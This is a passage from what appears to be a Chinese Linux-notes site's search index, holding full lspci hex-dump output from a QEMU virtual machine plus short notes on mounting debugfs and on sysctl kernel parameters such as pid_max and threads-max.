+-05.0 Red Hat, Inc. Virtio network device +-06.0 Red Hat, Inc. Virtio block device +-07.0 Red Hat, Inc. Virtio block device \\-08.0 Red Hat, Inc. Virtio memory balloon [root@VM-0-16-centos ~]# lspci |grep -i eth 00:05.0 Ethernet controller: Red Hat, Inc. Virtio network device [root@VM-0-16-centos ~]# lspci -vvxxx 00:00.0 Host bridge: Intel Corporation 440FX - 82441FX PMC [Natoma] (rev 02) Subsystem: Red Hat, Inc. Qemu virtual machine Control: I/O+ Mem+ BusMaster- SpecCycle- MemWINV- VGASnoop- ParErr- Stepping- SERR+ FastB2B- DisINTx- Status: Cap- 66MHz- UDF- FastB2B- ParErr- DEVSEL=fast >TAbort- <TAbort- <MAbort- >SERR- <PERR- INTx- 00: 86 80 37 12 03 01 00 00 02 00 00 06 00 00 00 00 10: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 20: 00 00 00 00 00 00 00 00 00 00 00 00 f4 1a 00 11 30: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 40: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 50: 00 00 00 00 00 00 00 ff 00 10 11 11 11 11 11 31 60: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 70: 00 00 0a 00 00 00 00 00 00 00 00 00 00 00 00 00 80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 90: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 a0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 b0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 c0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 d0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 e0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 f0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00:01.0 ISA bridge: Intel Corporation 82371SB PIIX3 ISA [Natoma/Triton II] Subsystem: Red Hat, Inc. Qemu virtual machine Control: I/O+ Mem+ BusMaster- SpecCycle- MemWINV- VGASnoop- ParErr- Stepping- SERR+ FastB2B- DisINTx- Status: Cap- 66MHz- UDF- FastB2B- ParErr- DEVSEL=medium >TAbort- <TAbort- <MAbort- >SERR- <PERR- INTx- 00: 86 80 00 70 03 01 00 02 00 00 01 06 00 00 80 00 10: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 20: 00 00 00 00 00 00 00 00 00 00 00 00 f4 1a 00 11 30: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 40: 00 00 00 00 00 00 00 00 00 00 00 00 4d 00 03 00 50: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 60: 0a 0a 0b 0b 00 00 00 00 00 02 00 00 00 00 00 00 70: 80 00 00 00 00 00 0c 0c 02 00 00 00 00 00 00 00 80: 00 00 02 00 00 00 00 00 00 00 00 00 00 00 00 00 90: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 a0: 08 00 00 00 00 00 00 00 0f 00 00 00 00 00 00 00 b0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 c0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 d0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 e0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 f0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00:01.1 IDE interface: Intel Corporation 82371SB PIIX3 IDE [Natoma/Triton II] (prog-if 80 [ISA Compatibility mode-only controller, supports bus mastering]) Subsystem: Red Hat, Inc. Qemu virtual machine Control: I/O+ Mem+ BusMaster+ SpecCycle- MemWINV- VGASnoop- ParErr- Stepping- SERR+ FastB2B- DisINTx- Status: Cap- 66MHz- UDF- FastB2B+ ParErr- DEVSEL=medium >TAbort- <TAbort- <MAbort- >SERR- <PERR- INTx- Latency: 0 Region 0: [virtual] Memory at 000001f0 (32-bit, non-prefetchable) [size=8] Region 1: [virtual] Memory at 000003f0 (type 3, non-prefetchable) Region 2: [virtual] Memory at 00000170 (32-bit, non-prefetchable) [size=8] Region 3: [virtual] Memory at 00000370 (type 3, non-prefetchable) Region 4: I/O ports at e100 [size=16] Kernel driver in use: ata_piix Kernel modules: ata_piix, pata_acpi, ata_generic 00: 86 80 10 70 07 01 80 02 00 80 01 01 00 00 00 00 10: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 20: 01 e1 00 00 00 00 00 00 00 00 00 00 f4 1a 00 11 30: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 40: 30 c0 00 c0 0b 00 00 00 00 00 00 00 00 00 00 00 50: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 60: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 70: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 90: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 a0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 b0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 c0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 d0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 e0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 f0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00:01.2 USB controller: Intel Corporation 82371SB PIIX3 USB [Natoma/Triton II] (rev 01) (prog-if 00 [UHCI]) Subsystem: Red Hat, Inc. QEMU Virtual Machine Control: I/O+ Mem+ BusMaster+ SpecCycle- MemWINV- VGASnoop- ParErr- Stepping- SERR+ FastB2B- DisINTx- Status: Cap- 66MHz- UDF- FastB2B- ParErr- DEVSEL=fast >TAbort- <TAbort- <MAbort- >SERR- <PERR- INTx- Latency: 0 Interrupt: pin D routed to IRQ 11 Region 4: I/O ports at e0c0 [size=32] Kernel driver in use: uhci_hcd 00: 86 80 20 70 07 01 00 00 01 00 03 0c 00 00 00 00 10: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 20: c1 e0 00 00 00 00 00 00 00 00 00 00 f4 1a 00 11 30: 00 00 00 00 00 00 00 00 00 00 00 00 0b 04 00 00 40: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 50: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 60: 10 00 00 00 00 00 00 00 00 00 01 00 00 00 00 00 70: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 90: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 a0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 b0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 c0: 00 20 00 00 00 00 00 00 00 00 00 00 00 00 00 00 d0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 e0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 f0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00:01.3 Bridge: Intel Corporation 82371AB/EB/MB PIIX4 ACPI (rev 03) Subsystem: Red Hat, Inc. Qemu virtual machine Control: I/O+ Mem+ BusMaster- SpecCycle- MemWINV- VGASnoop- ParErr- Stepping- SERR+ FastB2B- DisINTx- Status: Cap- 66MHz- UDF- FastB2B+ ParErr- DEVSEL=medium >TAbort- <TAbort- <MAbort- >SERR- <PERR- INTx- Interrupt: pin A routed to IRQ 9 Kernel driver in use: piix4_smbus Kernel modules: i2c_piix4 00: 86 80 13 71 03 01 80 02 03 00 80 06 00 00 00 00 10: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 20: 00 00 00 00 00 00 00 00 00 00 00 00 f4 1a 00 11 30: 00 00 00 00 00 00 00 00 00 00 00 00 09 01 00 00 40: 01 06 00 00 00 00 00 00 00 00 00 00 00 00 00 00 50: 00 00 00 00 00 00 00 00 00 00 00 02 00 00 00 10 60: 00 00 00 60 00 00 00 08 00 00 00 00 00 00 00 00 70: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 80: 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 90: 01 07 00 00 00 00 00 00 00 00 00 00 00 00 00 00 a0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 b0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 c0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 d0: 00 00 09 00 00 00 00 00 00 00 00 00 00 00 00 00 e0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 f0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00:02.0 VGA compatible controller: Cirrus Logic GD 5446 (prog-if 00 [VGA controller]) Subsystem: Red Hat, Inc. QEMU Virtual Machine Control: I/O+ Mem+ BusMaster- SpecCycle- MemWINV- VGASnoop- ParErr- Stepping- SERR+ FastB2B- DisINTx- Status: Cap- 66MHz- UDF- FastB2B- ParErr- DEVSEL=fast >TAbort- <TAbort- <MAbort- >SERR- <PERR- INTx- Region 0: Memory at fc000000 (32-bit, prefetchable) [size=32M] Region 1: Memory at fea20000 (32-bit, non-prefetchable) [size=4K] Expansion ROM at fea00000 [disabled] [size=64K] Kernel driver in use: cirrus Kernel modules: cirrus 00: 13 10 b8 00 03 01 00 00 00 00 00 03 00 00 00 00 10: 08 00 00 fc 00 00 a2 fe 00 00 00 00 00 00 00 00 20: 00 00 00 00 00 00 00 00 00 00 00 00 f4 1a 00 11 30: 00 00 a0 fe 00 00 00 00 00 00 00 00 00 00 00 00 40: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 50: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 60: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 70: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 90: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 a0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 b0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 c0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 d0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 e0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 f0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00:03.0 PCI bridge: Red Hat, Inc. QEMU PCI-PCI bridge (prog-if 00 [Normal decode]) Control: I/O+ Mem+ BusMaster- SpecCycle- MemWINV- VGASnoop- ParErr- Stepping- SERR+ FastB2B- DisINTx- Status: Cap+ 66MHz+ UDF- FastB2B+ ParErr- DEVSEL=fast >TAbort- <TAbort- <MAbort- >SERR- <PERR- INTx- Interrupt: pin A routed to IRQ 11 Region 0: Memory at fea21000 (64-bit, non-prefetchable) [size=256] Bus: primary=00, secondary=01, subordinate=01, sec-latency=0 I/O behind bridge: 0000d000-0000dfff Memory behind bridge: fe800000-fe9fffff Prefetchable memory behind bridge: 00000000fe200000-00000000fe3fffff Secondary status: 66MHz+ FastB2B+ ParErr- DEVSEL=fast >TAbort- <TAbort- <MAbort- <SERR- <PERR- BridgeCtl: Parity- SERR+ NoISA- VGA- MAbort- >Reset- FastB2B- PriDiscTmr- SecDiscTmr- DiscTmrStat- DiscTmrSERREn- Capabilities: [4c] MSI: Enable- Count=1/1 Maskable+ 64bit+ Address: 0000000000000000 Data: 0000 Masking: 00000000 Pending: 00000000 Capabilities: [48] Slot ID: 0 slots, First+, chassis 01 Capabilities: [40] Hot-plug capable 00: 36 1b 01 00 03 01 b0 00 00 00 04 06 00 00 01 00 10: 04 10 a2 fe 00 00 00 00 00 01 01 00 d0 d0 a0 00 20: 80 fe 90 fe 21 fe 31 fe 00 00 00 00 00 00 00 00 30: 00 00 00 00 4c 00 00 00 00 00 00 00 0b 01 02 00 40: 0c 00 00 00 00 00 00 00 04 40 20 01 05 48 80 01 50: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 60: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 70: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 90: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 a0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 b0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 c0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 d0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 e0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 f0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00:04.0 PCI bridge: Red Hat, Inc. QEMU PCI-PCI bridge (prog-if 00 [Normal decode]) Control: I/O+ Mem+ BusMaster- SpecCycle- MemWINV- VGASnoop- ParErr- Stepping- SERR+ FastB2B- DisINTx- Status: Cap+ 66MHz+ UDF- FastB2B+ ParErr- DEVSEL=fast >TAbort- <TAbort- <MAbort- >SERR- <PERR- INTx- Interrupt: pin A routed to IRQ 11 Region 0: Memory at fea22000 (64-bit, non-prefetchable) [size=256] Bus: primary=00, secondary=02, subordinate=02, sec-latency=0 I/O behind bridge: 0000c000-0000cfff Memory behind bridge: fe600000-fe7fffff Prefetchable memory behind bridge: 00000000fe000000-00000000fe1fffff Secondary status: 66MHz+ FastB2B+ ParErr- DEVSEL=fast >TAbort- <TAbort- <MAbort- <SERR- <PERR- BridgeCtl: Parity- SERR+ NoISA- VGA- MAbort- >Reset- FastB2B- PriDiscTmr- SecDiscTmr- DiscTmrStat- DiscTmrSERREn- Capabilities: [4c] MSI: Enable- Count=1/1 Maskable+ 64bit+ Address: 0000000000000000 Data: 0000 Masking: 00000000 Pending: 00000000 Capabilities: [48] Slot ID: 0 slots, First+, chassis 02 Capabilities: [40] Hot-plug capable 00: 36 1b 01 00 03 01 b0 00 00 00 04 06 00 00 01 00 10: 04 20 a2 fe 00 00 00 00 00 02 02 00 c0 c0 a0 00 20: 60 fe 70 fe 01 fe 11 fe 00 00 00 00 00 00 00 00 30: 00 00 00 00 4c 00 00 00 00 00 00 00 0b 01 02 00 40: 0c 00 00 00 00 00 00 00 04 40 20 02 05 48 80 01 50: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 60: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 70: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 90: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 a0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 b0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 c0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 d0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 e0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 f0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00:05.0 Ethernet controller: Red Hat, Inc. Virtio network device Subsystem: Red Hat, Inc. Device 0001 Physical Slot: 5 Control: I/O+ Mem+ BusMaster+ SpecCycle- MemWINV- VGASnoop- ParErr- Stepping- SERR+ FastB2B- DisINTx+ Status: Cap+ 66MHz- UDF- FastB2B- ParErr- DEVSEL=fast >TAbort- <TAbort- <MAbort- >SERR- <PERR- INTx- Latency: 0 Interrupt: pin A routed to IRQ 10 Region 0: I/O ports at e000 [size=64] Region 1: Memory at fea23000 (32-bit, non-prefetchable) [size=4K] Region 4: Memory at fe400000 (64-bit, prefetchable) [size=16K] Expansion ROM at fea10000 [disabled] [size=64K] Capabilities: [98] MSI-X: Enable+ Count=6 Masked- Vector table: BAR=1 offset=00000000 PBA: BAR=1 offset=00000800 Capabilities: [84] Vendor Specific Information: VirtIO: <unknown> BAR=0 offset=00000000 size=00000000 Capabilities: [70] Vendor Specific Information: VirtIO: Notify BAR=4 offset=00003000 size=00001000 multiplier=00000004 Capabilities: [60] Vendor Specific Information: VirtIO: DeviceCfg BAR=4 offset=00002000 size=00001000 Capabilities: [50] Vendor Specific Information: VirtIO: ISR BAR=4 offset=00001000 size=00001000 Capabilities: [40] Vendor Specific Information: VirtIO: CommonCfg BAR=4 offset=00000000 size=00001000 Kernel driver in use: virtio-pci Kernel modules: virtio_pci 00: f4 1a 00 10 07 05 10 00 00 00 00 02 00 00 00 00 10: 01 e0 00 00 00 30 a2 fe 00 00 00 00 00 00 00 00 20: 0c 00 40 fe 00 00 00 00 00 00 00 00 f4 1a 01 00 30: 00 00 a1 fe 98 00 00 00 00 00 00 00 0a 01 00 00 40: 09 00 10 01 04 00 00 00 00 00 00 00 00 10 00 00 50: 09 40 10 03 04 00 00 00 00 10 00 00 00 10 00 00 60: 09 50 10 04 04 00 00 00 00 20 00 00 00 10 00 00 70: 09 60 14 02 04 00 00 00 00 30 00 00 00 10 00 00 80: 04 00 00 00 09 70 14 05 00 00 00 00 00 00 00 00 90: 00 00 00 00 00 00 00 00 11 84 05 80 01 00 00 00 a0: 01 08 00 00 00 00 00 00 00 00 00 00 00 00 00 00 b0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 c0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 d0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 e0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 f0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00:06.0 SCSI storage controller: Red Hat, Inc. Virtio block device Subsystem: Red Hat, Inc. Device 0002 Physical Slot: 6 Control: I/O+ Mem+ BusMaster+ SpecCycle- MemWINV- VGASnoop- ParErr- Stepping- SERR+ FastB2B- DisINTx+ Status: Cap+ 66MHz- UDF- FastB2B- ParErr- DEVSEL=fast >TAbort- <TAbort- <MAbort- >SERR- <PERR- INTx- Latency: 0 Interrupt: pin A routed to IRQ 10 Region 0: I/O ports at e040 [size=64] Region 1: Memory at fea24000 (32-bit, non-prefetchable) [size=4K] Region 4: Memory at fe404000 (64-bit, prefetchable) [size=16K] Capabilities: [98] MSI-X: Enable+ Count=2 Masked- Vector table: BAR=1 offset=00000000 PBA: BAR=1 offset=00000800 Capabilities: [84] Vendor Specific Information: VirtIO: <unknown> BAR=0 offset=00000000 size=00000000 Capabilities: [70] Vendor Specific Information: VirtIO: Notify BAR=4 offset=00003000 size=00001000 multiplier=00000004 Capabilities: [60] Vendor Specific Information: VirtIO: DeviceCfg BAR=4 offset=00002000 size=00001000 Capabilities: [50] Vendor Specific Information: VirtIO: ISR BAR=4 offset=00001000 size=00001000 Capabilities: [40] Vendor Specific Information: VirtIO: CommonCfg BAR=4 offset=00000000 size=00001000 Kernel driver in use: virtio-pci Kernel modules: virtio_pci 00: f4 1a 01 10 07 05 10 00 00 00 00 01 00 00 00 00 10: 41 e0 00 00 00 40 a2 fe 00 00 00 00 00 00 00 00 20: 0c 40 40 fe 00 00 00 00 00 00 00 00 f4 1a 02 00 30: 00 00 00 00 98 00 00 00 00 00 00 00 0a 01 00 00 40: 09 00 10 01 04 00 00 00 00 00 00 00 00 10 00 00 50: 09 40 10 03 04 00 00 00 00 10 00 00 00 10 00 00 60: 09 50 10 04 04 00 00 00 00 20 00 00 00 10 00 00 70: 09 60 14 02 04 00 00 00 00 30 00 00 00 10 00 00 80: 04 00 00 00 09 70 14 05 00 00 00 00 00 00 00 00 90: 00 00 00 00 00 00 00 00 11 84 01 80 01 00 00 00 a0: 01 08 00 00 00 00 00 00 00 00 00 00 00 00 00 00 b0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 c0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 d0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 e0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 f0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00:07.0 SCSI storage controller: Red Hat, Inc. Virtio block device Subsystem: Red Hat, Inc. Device 0002 Physical Slot: 7 Control: I/O+ Mem+ BusMaster+ SpecCycle- MemWINV- VGASnoop- ParErr- Stepping- SERR+ FastB2B- DisINTx+ Status: Cap+ 66MHz- UDF- FastB2B- ParErr- DEVSEL=fast >TAbort- <TAbort- <MAbort- >SERR- <PERR- INTx- Latency: 0 Interrupt: pin A routed to IRQ 11 Region 0: I/O ports at e080 [size=64] Region 1: Memory at fea25000 (32-bit, non-prefetchable) [size=4K] Region 4: Memory at fe408000 (64-bit, prefetchable) [size=16K] Capabilities: [98] MSI-X: Enable+ Count=2 Masked- Vector table: BAR=1 offset=00000000 PBA: BAR=1 offset=00000800 Capabilities: [84] Vendor Specific Information: VirtIO: <unknown> BAR=0 offset=00000000 size=00000000 Capabilities: [70] Vendor Specific Information: VirtIO: Notify BAR=4 offset=00003000 size=00001000 multiplier=00000004 Capabilities: [60] Vendor Specific Information: VirtIO: DeviceCfg BAR=4 offset=00002000 size=00001000 Capabilities: [50] Vendor Specific Information: VirtIO: ISR BAR=4 offset=00001000 size=00001000 Capabilities: [40] Vendor Specific Information: VirtIO: CommonCfg BAR=4 offset=00000000 size=00001000 Kernel driver in use: virtio-pci Kernel modules: virtio_pci 00: f4 1a 01 10 07 05 10 00 00 00 00 01 00 00 00 00 10: 81 e0 00 00 00 50 a2 fe 00 00 00 00 00 00 00 00 20: 0c 80 40 fe 00 00 00 00 00 00 00 00 f4 1a 02 00 30: 00 00 00 00 98 00 00 00 00 00 00 00 0b 01 00 00 40: 09 00 10 01 04 00 00 00 00 00 00 00 00 10 00 00 50: 09 40 10 03 04 00 00 00 00 10 00 00 00 10 00 00 60: 09 50 10 04 04 00 00 00 00 20 00 00 00 10 00 00 70: 09 60 14 02 04 00 00 00 00 30 00 00 00 10 00 00 80: 04 00 00 00 09 70 14 05 00 00 00 00 00 00 00 00 90: 00 00 00 00 00 00 00 00 11 84 01 80 01 00 00 00 a0: 01 08 00 00 00 00 00 00 00 00 00 00 00 00 00 00 b0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 c0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 d0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 e0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 f0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00:08.0 Unclassified device [00ff]: Red Hat, Inc. Virtio memory balloon Subsystem: Red Hat, Inc. Device 0005 Physical Slot: 8 Control: I/O+ Mem+ BusMaster+ SpecCycle- MemWINV- VGASnoop- ParErr- Stepping- SERR+ FastB2B- DisINTx- Status: Cap+ 66MHz- UDF- FastB2B- ParErr- DEVSEL=fast >TAbort- <TAbort- <MAbort- >SERR- <PERR- INTx- Latency: 0 Interrupt: pin A routed to IRQ 11 Region 0: I/O ports at e0e0 [size=32] Region 4: Memory at fe40c000 (64-bit, prefetchable) [size=16K] Capabilities: [84] Vendor Specific Information: VirtIO: <unknown> BAR=0 offset=00000000 size=00000000 Capabilities: [70] Vendor Specific Information: VirtIO: Notify BAR=4 offset=00003000 size=00001000 multiplier=00000004 Capabilities: [60] Vendor Specific Information: VirtIO: DeviceCfg BAR=4 offset=00002000 size=00001000 Capabilities: [50] Vendor Specific Information: VirtIO: ISR BAR=4 offset=00001000 size=00001000 Capabilities: [40] Vendor Specific Information: VirtIO: CommonCfg BAR=4 offset=00000000 size=00001000 Kernel driver in use: virtio-pci Kernel modules: virtio_pci 00: f4 1a 02 10 07 01 10 00 00 00 ff 00 00 00 00 00 10: e1 e0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 20: 0c c0 40 fe 00 00 00 00 00 00 00 00 f4 1a 05 00 30: 00 00 00 00 84 00 00 00 00 00 00 00 0b 01 00 00 40: 09 00 10 01 04 00 00 00 00 00 00 00 00 10 00 00 50: 09 40 10 03 04 00 00 00 00 10 00 00 00 10 00 00 60: 09 50 10 04 04 00 00 00 00 20 00 00 00 10 00 00 70: 09 60 14 02 04 00 00 00 00 30 00 00 00 10 00 00 80: 04 00 00 00 09 70 14 05 00 00 00 00 00 00 00 00 90: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 a0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 b0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 c0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 d0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 e0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 f0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00","title":"lspci\u547d\u4ee4"},{"location":"system/linux/IO/mount/","text":"mount\u547d\u4ee4 [mount \u4e2d\u6587\u624b\u518c \u91d1\u6b65\u56fd] (jinbuguo.com) \u6302\u8f7ddebugfs\u6587\u4ef6\u7cfb\u7edf\u5728\u67d0\u4e2a\u76ee\u5f55\u4e0a mount -t debugfs debugfs /sys/kernel/debug mount -t debugfs debugfs /opt/debug","title":"mount\u547d\u4ee4"},{"location":"system/linux/IO/mount/#mount","text":"[mount \u4e2d\u6587\u624b\u518c \u91d1\u6b65\u56fd] (jinbuguo.com) \u6302\u8f7ddebugfs\u6587\u4ef6\u7cfb\u7edf\u5728\u67d0\u4e2a\u76ee\u5f55\u4e0a mount -t debugfs debugfs /sys/kernel/debug mount -t debugfs debugfs /opt/debug","title":"mount\u547d\u4ee4"},{"location":"system/linux/IO/%E5%86%85%E6%A0%B8%E5%8F%82%E6%95%B0/","text":"\u5185\u6838\u53c2\u6570 \u914d\u7f6e\u6587\u4ef6/etc/sysctl.conf\u548c/proc/sys\u4e0b\u5185\u6838\u6587\u4ef6\u7684\u5173\u7cfb \u4e0b\u9762\u4ecb\u7ecd\u4e00\u4e0b/proc/sys\u4e0b\u5185\u6838\u6587\u4ef6\u4e0e\u914d\u7f6e\u6587\u4ef6sysctl.conf\u4e2d\u53d8\u91cf\u7684\u5bf9\u5e94\u5173\u7cfb\uff1a \u7531\u4e8e\u53ef\u4ee5\u4fee\u6539\u7684\u5185\u6838\u53c2\u6570\u90fd\u5728/proc/sys\u76ee\u5f55\u4e0b\uff0c\u6240\u4ee5sysctl.conf\u7684\u53d8\u91cf\u540d\u7701\u7565\u4e86\u76ee\u5f55\u7684\u524d\u9762\u90e8\u5206\uff08/proc/sys\uff09\u3002 \u5373\u5c06/proc/sys\u4e2d\u7684\u6587\u4ef6\u8f6c\u6362\u6210sysctl\u4e2d\u7684\u53d8\u91cf\u4f9d\u636e\u4e0b\u9762\u4e24\u4e2a\u7b80\u5355\u7684\u89c4\u5219\uff1a \u53bb\u6389\u524d\u9762\u90e8\u5206/proc/sys \u5c06\u6587\u4ef6\u540d\u4e2d\u7684\u659c\u6760\u53d8\u4e3a\u70b9 \u8fd9\u4e24\u6761\u89c4\u5219\u53ef\u4ee5\u5c06/proc/sys\u4e2d\u7684\u4efb\u4e00\u6587\u4ef6\u540d\u8f6c\u6362\u6210sysctl\u4e2d\u7684\u53d8\u91cf\u540d\u3002 \u4f8b\u5982\uff1a /proc/sys/net/ipv4/ip_forward \uff1d\u300b net.ipv4.ip_forward /proc/sys/kernel/hostname \uff1d\u300b kernel.hostname \u53ef\u4ee5\u4f7f\u7528\u4e0b\u9762\u547d\u4ee4\u67e5\u8be2\u6240\u6709\u53ef\u4fee\u6539\u7684\u53d8\u91cf\u540d sysctl \u2013a \u8ba1\u7b97\u76f8\u5173\uff1a /proc/sys/kernel/threads-max \u6700\u5927\u7ebf\u7a0b\u6570\u91cf\uff0c\u53ef\u5199\u5165\u7684\u6700\u5c0f\u503c\u4e3a20\u3002\u53ef\u5199\u5165\u7684\u6700\u5927\u503c\u7531\u5e38\u6570FUTEX_TID_MASK\uff080x3fffffff\uff09\u7ed9\u51fa\u3002\u5982\u679c\u5c06\u8d85\u51fa\u6b64\u8303\u56f4\u7684\u503c\u5199\u5165threads max\uff0c\u5219\u4f1a\u51fa\u73b0\u9519\u8befEINVAL /proc/sys/kernel/pid_max \u53ef\u5206\u914dPID\u7684\u6570\u91cf\uff0c\u56e0\u6b64\uff0c\u6b64\u6587\u4ef6\u7684\u503c\u8fd8\u5145\u5f53\u7cfb\u7edf\u8303\u56f4\u5185\u8fdb\u7a0b\u548c\u7ebf\u7a0b\u603b\u6570\u7684\u9650\u5236\u3002\u572832\u4f4d\u5e73\u53f0\u4e0a\uff0c32768\u662fpid_max\u7684\u6700\u5927\u503c\u3002\u572864\u4f4d\u7cfb\u7edf\u4e0a\uff0cpid_max\u53ef\u4ee5\u8bbe\u7f6e\u4e3a\u6700\u5927\u4e3a2^22\u7684\u4efb\u4f55\u503c\uff08pid_max_LIMIT\uff0c\u7ea6400\u4e07\uff09\u3002 /usr/include/bits/local_lim.h _POSIX_THREAD_THREADS_MAX \u5355\u4e2a\u8fdb\u7a0b\u6700\u5927\u7ebf\u7a0b\u6570\u91cf /proc/sys/vm/max_map_count \u5355\u8fdb\u7a0b\u6700\u5927\u5206\u914dmap /proc/sys/kernel/watchdog_thresh Linux watchdog \u7684\u5f02\u5e38\u7b49\u5f85\u65f6\u95f4\u662f\u901a\u8fc7 /proc/sys/kernel/watchdog_thresh \u8bbe\u7f6e\u7684\uff0c\u4e00\u822c\u9ed8\u8ba4\u4e3a 60 \u79d2\u3002 /proc/sysrq-trigger 